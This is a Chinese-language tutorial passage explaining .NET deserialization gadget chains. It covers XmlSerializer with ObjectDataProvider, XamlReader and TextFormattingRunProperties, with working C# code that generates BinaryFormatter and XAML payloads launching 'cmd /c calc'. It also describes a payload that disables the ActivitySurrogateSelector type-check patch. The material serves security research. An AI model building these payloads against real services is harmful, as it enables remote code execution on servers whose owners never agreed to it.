        Wrapper wrapper = new Wrapper();
        wrapper.contentB= new ObjectDataProvider();
        wrapper.contentB.ObjectInstance = new Calculator();
        wrapper.contentB.MethodName = "Test";
        wrapper.contentB.MethodParameters.Add("first");
        wrapper.contentB.MethodParameters.Add("second");
        Console.WriteLine(typeof(Wrapper));
        TextWriter fs = new StreamWriter("./ExpandTest.txt");
        XmlSerializer serializers = new XmlSerializer(typeof(Wrapper));
        serializers.Serialize(fs, wrapper);
        fs.Close();
        FileStream fr = new FileStream("./ExpandTest.txt", FileMode.Open);
        var deserializers = new XmlSerializer(typeof(Wrapper));
        deserializers.Deserialize(fr);
        fr.Close();
    }
上面的代码在反序列化时可以正常触发Calculator 的 Test函数。
在现实中，与我们设想的封装类型相似的就是 ExpandedWrapper类
    [EditorBrowsable(EditorBrowsableState.Never)]
    public sealed class ExpandedWrapper : ExpandedWrapper
    {
        public ExpandedWrapper();
        public TProperty0 ProjectedProperty0 { get; set; }
        protected override object InternalGetExpandedPropertyValue(int nameIndex);
    }
相似的封装过程如下：
    static void ExpandTest()
    {
        ExpandedWrapper wrapper = new ExpandedWrapper();
        wrapper.ProjectedProperty0 = new ObjectDataProvider();
        wrapper.ProjectedProperty0.ObjectInstance = new Calculator();
        wrapper.ProjectedProperty0.MethodName = "Test";
        wrapper.ProjectedProperty0.MethodParameters.Add("first");
        wrapper.ProjectedProperty0.MethodParameters.Add("second");
        TextWriter fs = new StreamWriter("./ExpandTest.txt");
        Console.WriteLine(typeof(ExpandedWrapper));
        XmlSerializer serializers = new XmlSerializer(typeof(ExpandedWrapper));
        serializers.Serialize(fs, wrapper);
        fs.Close();
        FileStream fr = new FileStream("./ExpandTest.txt", FileMode.Open);
        var deserializers = new XmlSerializer(typeof(ExpandedWrapper));
        deserializers.Deserialize(fr);
        fr.Close();
    }
> 在第一次看到使用 ExpandedWrapper 来封装时，我很奇怪到底是什么在起作用使得XmlSerializer
> 能够正常序列化下去，后来才发现只是因为它是一个有两个类型参数的泛型类。假如需要，我们还可以找有3个、4个类型参数的泛型类，比如：
>
> ExpandedWrapper ExpandedWrapper
>
> 这个类最多支持8个类型参数
此时有一个问题无法忽略，为什么XmlSerializer 可以在反序列化ObjectDataProvider
的时候触发函数执行？之前用BinaryFormatte 时明明还不可以，根据我们对ObjectDataProvider
的了解，难道是反序列化时使用了Add方法去添加参数？
#### 0x23 XmlSerializer反序列化细节
XmlSerializer 在初始化的时候会自动生成一个动态程序集加载在内容中，并调用该程序集里自动生成的代码完成反序列化过程。下面便是该程序集：
可以看到动态程序集里有一个XmlSerializationReaderExpandedWrapper2 类，专门用于在反序列化时读取数据。
相应的，也有一个XmlSerializationWriterExpandedWrapper2 类专门用于在序列化时写入数据。
下面我们看一下反序列化的过程：
在Read8_Item() 函数里，直接初始化了一个 ExpendedWrapper
实例，目前它还是空的，但是后续会往里填数据。这个实例就是反序列化生成的实例。
仍旧是在Read8_Item() 函数里， 这里调用Read7_ObjectDataProvider() 函数生成一个ObjectDataProvider
实例，并赋给了expandedWrapper 的 ProjectedProperty0 字段。所以Read7_ObjectDataProvider()
肯定是用于读取数据并初始化一个ObjectDataProvider实例，跟进去：
忽略无关的部分，我们可以看到，这里是通过Add方法来向MethodParameters 里添加参数的。
该Add方法会进入Collection 的Add方法，然后调用InsertItem()
，然后调用前面说过的OnCollectionChanged函数，然后就会调用Refresh()函数，进而检查是否需要调用目标 Test()
函数。当Add第二个参数时，就会调用Test 函数。
所以以上就是XmlSerializer 可以在反序列化ObjectDataProvider时触发函数执行的原因。
#### 0x24 替换Claculator类
前面我们已经可以在反序列化时触发执行Calculator 类的Test 方法。但是现实中的目标环境是没有Calculator
类的，我们必须找到一个普遍使用的类，并且调用其某个函数（传给该函数的参数可控），可以实现代码执行（最理想的应当是Process类，但是它不能用）。
替换方案有多种选择，ysoserial.NET 里提供了LosFormatter 和 XamlReader 两种方式。
但是我仔细看了一下，发现它的思路是这样的，将Calculator 类替换为 LosFormatter 或者 XamlReader类，将要调用的函数指定为
LosFormatter 的 Deserializer函数 或者是XamlReader 的Parse 函数，然后将参数替换为LosFormattter 或者
XamlReader 的反序列化漏洞payload。
简单的说，就是在反序列化 XmlSerializer payload（本文的目标） 时，借助ObjectDataProvider 调用
LosFormatter 的反序列化函数，然后把LosFormatter 的反序列化Payload
传给这个函数，然后利用LosFormatter的反序列化漏洞执行代码，XamlReader 方案也是类似。
套娃啊，，，当你看过XamlReader 的反序列化payload后这个感觉会更强烈：
                cmd
                /c calc
很明显，这里XamlReader 的反序列化payload 也使用了ObjectDataProvider工具，确实挺套娃的。整个流程大概如下：
XmlSerializer类 -> Deserizalize方法 -> ObjectDataProvider封装 -> XamlReader类 ->
Parse方法 -> ObjectDataProvider封装 -> Process类 -> start方法 -> calc
在借助ObjectDataProvider 生成payload时，使用XamlReader 与 XmlSerializer 最大不同就是XamlReader
可以序列化Process，所以生成它的payload就更加简单一些。 由于过程类似，这里我们就不再多说，主要是需要了解一下Xaml
语法。下面贴出一种生成Xaml payload的代码（ysoserial.net
中提供了多种方式生成XamlReader的Payload，想要了解的可以自己去看一下）：
    static void xamltest()
    {
        var psi = new ProcessStartInfo();
        psi.FileName = "calc";
        psi.Arguments = "test";
        // 去掉多余的环境变量
        StringDictionary dict = new StringDictionary();
        psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
        var p = new Process();
        p.StartInfo = psi;
        var obj = new ObjectDataProvider();
        obj.MethodName = "Start";
        obj.IsInitialLoadEnabled = false;
        obj.ObjectInstance = p;
        XmlWriterSettings settings = new XmlWriterSettings();
        settings.Indent = true;
        using (XmlWriter writer = XmlWriter.Create("test.xaml", settings))
        {
            System.Windows.Markup.XamlWriter.Save(obj, writer);
        }
        string text = File.ReadAllText("test.xaml");
        Console.WriteLine(text);
    }
看完上面的内容相信你已经可以写出生成XmlSerializer 反序列化Payload 的代码了，这个小任务就留给你自己完成吧。
在实际利用中，XmlSerializer反序列化漏洞的关键点是需要控制XmlSerializer 初始化时传进去的Type类型。
## 四.TextFormattingRunProperties 工具链
> TextFormattingRunProperties 的特点就是将Xaml 的 payload 封装为BinaryFormatter
> 之类序列化器的payload
### 0x10 TextFormattingRunProperties 介绍
TextFormattingRunProperties
类位于命名空间：Microsoft.VisualStudio.Text.Formatting。其在Microsoft.VisualStudio.Text.UI.Wpf.dll
和 Microsoft.PowerShell.Editor.dll 程序集中都有实现，前者需要安装Visual Studio
，而后者则是PowerShell 自带。所以目标环境没有安装VS也是可以使用这个类的。
### 0x20 使用TextFormattingRunProperties 进行封装
使用TextFormattingRunProperties进行封装与我们在《ActivitySurrogateSelectorGenerator
工具链》中提到的AxHost.State 极其相似。原理上就是新建一个类型，借助GetObjectData()
来将源数据封装到TextFormattingRunProperties序列化数据里，下面是一个样例：
    [Serializable]
    public class PayloadClass : ISerializable
    {
        string _xamlPayload;
        public PayloadClass(string payload)
        {
            _xamlPayload = payload;
        }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(TextFormattingRunProperties));
            info.AddValue("ForegroundBrush", _xamlPayload);
        }
    }
代码里我们新建了一个payloadClass
类，其继承于ISerializable。关于该接口，我们在《ActivitySurrogateSelectorGenerator 工具链》
有过详细介绍。该接口定义的GetObjectData() 方法用于在序列化时从对象里提取数据并存储到 SerializationInfo
对象里，然后再使用这个SerializationInfo 对象进行后续的序列化。
在这里的GetObjectData()方法里，我们直接调用SerializationInfo 的 SetType() 和 AddValue()
方法来设置类型和数据。但是我们将类型设置为 TextFormattingRunProperties，并添加了ForegroundBrush
字段，其值设置为xaml Payload。这样做的结果就是，当我们使用BinaryFormatter 去序列化PayloadClass
的实例时，生成的序列化数据和PayloadClass 完全没关系，而是只和我们设置的 TextFormattingRunProperties 类型有关。
下面是进行序列化的代码：
    static string GenerateTextFormattingRunPropertiesPayload()
    {
        string payload = 
    @"
                cmd
                /c calc
    ";
        var pc = new PayloadClass(payload);
        var bfmt = new BinaryFormatter();
        var stm = new MemoryStream();
        bfmt.Serialize(stm, pc);
        return Convert.ToBase64String(stm.ToArray());
    }
我们使用《ObjectDataProvider工具链》中提到的Xalm Payload 作为原始Payload，然后用 BinaryFormatter
去序列化 PayloadClass 实例。这样最终序列化出的结果就是 TextFormattingRunProperties封装过的 Xaml
Payload。
但是这样做的理由是什么？
为什么要 用TextFormattingRunProperties 去封装 Xaml Payload？
为什么是 Xaml Payload？
为什么要将原始payload 存放在“ForegroundBrush” 字段中？
### 0x30 TextFormattingRunProperties 反序列化细节
使用以下代码去反序列化上一节生成的payload:
    static void TestPayload(string payload)
    {
        var bfmt = new BinaryFormatter();
        var stm = new MemoryStream(Convert.FromBase64String(payload));
        bfmt.Deserialize(stm);
    }
弹出计算器后会报一个错误，如下：
中间到底发生了什么？我们使用dnspy 调试一下：
发生异常时栈回溯如下：
我们重新调试，单步跟入SerializationInvoke()，发现进入了下面的这个函数：
很明显，这个函数用于在反序列化时重构TextFormattingRunProperties实例，数据都是从SerializationInfo
对象里提取的。重点在于这个 GetObjectFromSerializationInfo() 函数，根据字段名从 info 提取数据。我们进去看看：
这里就很简单了，提取出string 后直接交给XamlReader.Parse() 用于解析。XamlReader.Parse()
函数我们在《ObjectDataProvider工具链》里简单介绍过，借助ObjectDataProvider 的Xaml payload
可以实现代码执行。也就是说，我们在使用BinaryFormatter 反序列化 TextFormattingRunProperties
封装的数据时，最终会落到XamlReader 进行反序列化。所以TextFormattingRunProperties 的作用就是将Xaml Payload
封装为 BinaryFormatter(也包括losformatter、SoapFormatter) Payload，而且由于Xaml
Payload较为短小的特点，生成的TextFormattingRunProperties payload 也是 BinaryFormatter
payload中最短的。这就是我们为什么要使用TextFormattingRunProperties 封装Xaml payload。
那么为什么我们在VS中会报错呢？因为XamlReader.Parse() 解析出来的是一个ResourceDictionary
类型实例，我们将其赋值给Media.Brush 类型的变量，所以会导致报错。
### 0x40 ActivitySurrogateDisableTypeCheck 工具
在《ActivitySurrogateSelectorGenerator 工具链》 一章中我们曾经提到过ActivitySurrogateSelector
从.NET 4.8之后的补丁问题。
Nick Landers 在《[Re-Animating
ActivitySurrogateSelector](https://silentbreaksecurity.com/re-animating-activitysurrogateselector/)》一文中设计了关闭该检查的payload。该payload已被整合到 ysoserial.net
工具中的ActivitySurrogateDisableTypeCheck 部件。这个部件就是利用了TextFormattingRunProperties
来封装Xaml Payload。封装的Xaml payload 如下，用于关闭 类型检查：
    string xaml_payload = @"
                System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
                disableActivitySurrogateSelectorTypeCheck
                40
                true
                microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck
                true
    "
我们使用TextFormattingRunProperties 封装上述Xaml Payload 后，就生成了一个新的payload。该Payload
可以使用BinaryFormatter 进行反序列化，作用就是将
AppSettings.DisableActivitySurrogateSelectorTypeCheck
标志设置为True。这样的话，对于类似BinaryFormatter 反序列化漏洞的地方，我们就可以先用一个payload
关闭类型检查，再用ActivitySurrogateSelector 的payload 实现代码执行了。
但是，如果你用ysoserial.net 的 ActivitySurrogateDisableTypeCheck
部件生成payload，你还是会遇到前面说的报错的问题。如果因为这个报错导致你无法继续下去怎么办？还记得我们在《ActivitySurrogateSelectorGenerator
工具链》中提到过的AxHost.State 吗，其作用就是将BinaryFormatter 格式的payload 封装一下，用于遮掩原来payload
在反序列化时的异常。所以你可以用AxHost.State 把生成的 ActivitySurrogateDisableTypeCheck payload
再封装一次，这样在关闭类型检查的时候就不会报错了。
## 五.附录：
[1] 工具链原作者 James Forshaw 文章:
[2] 微软官方文档 标准查询运算符概述
[3] 《Re-Animating ActivitySurrogateSelector》
[4] 使用XmlInclude或SoapInclude属性来指定静态未知的类型
[5] WPF之Binding深入探讨
* * *